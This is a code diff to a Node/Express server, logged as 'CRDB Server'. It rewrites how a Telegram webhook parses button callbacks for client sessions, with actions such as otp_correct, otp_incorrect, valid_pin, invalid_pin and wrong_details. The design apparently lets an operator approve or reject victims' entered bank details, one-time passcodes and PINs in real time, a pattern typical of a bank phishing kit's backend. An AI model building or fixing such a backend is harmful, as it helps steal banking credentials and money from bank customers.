@@ -113,16 +113,32 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const callbackData = update.callback_query.data;
     const chatId = update.callback_query.message.chat.id;
     const messageId = update.callback_query.message.message_id;
-    let clientId = '';
+    
     let action = '';
+    let clientId = '';
 
+    // Robust parsing for actions containing single or double underscores
     if (callbackData.startsWith('loan_approved_')) {
       action = 'loan_approved';
       clientId = callbackData.replace('loan_approved_', '');
-    } else {
-      const parts = callbackData.split('_');
-      action = `${parts[0]}_${parts[1]}`;
-      clientId = parts[2];
+    } else if (callbackData.startsWith('wrong_details_')) {
+      action = 'wrong_details';
+      clientId = callbackData.replace('wrong_details_', '');
+    } else if (callbackData.startsWith('correct_details_')) {
+      action = 'correct_details';
+      clientId = callbackData.replace('correct_details_', '');
+    } else if (callbackData.startsWith('otp_correct_')) {
+      action = 'otp_correct';
+      clientId = callbackData.replace('otp_correct_', '');
+    } else if (callbackData.startsWith('otp_incorrect_')) {
+      action = 'otp_incorrect';
+      clientId = callbackData.replace('otp_incorrect_', '');
+    } else if (callbackData.startsWith('invalid_pin_')) {
+      action = 'invalid_pin';
+      clientId = callbackData.replace('invalid_pin_', '');
+    } else if (callbackData.startsWith('valid_pin_')) {
+      action = 'valid_pin';
+      clientId = callbackData.replace('valid_pin_', '');
     }
 
     if (!sessions[clientId]) sessions[clientId] = {};
@@ -163,4 +179,4 @@ app.post('/api/telegram-webhook', async (req, res) => {
 app.listen(PORT, () => {
   console.log(`CRDB Server running on port ${PORT}`);
 });
-    
+  
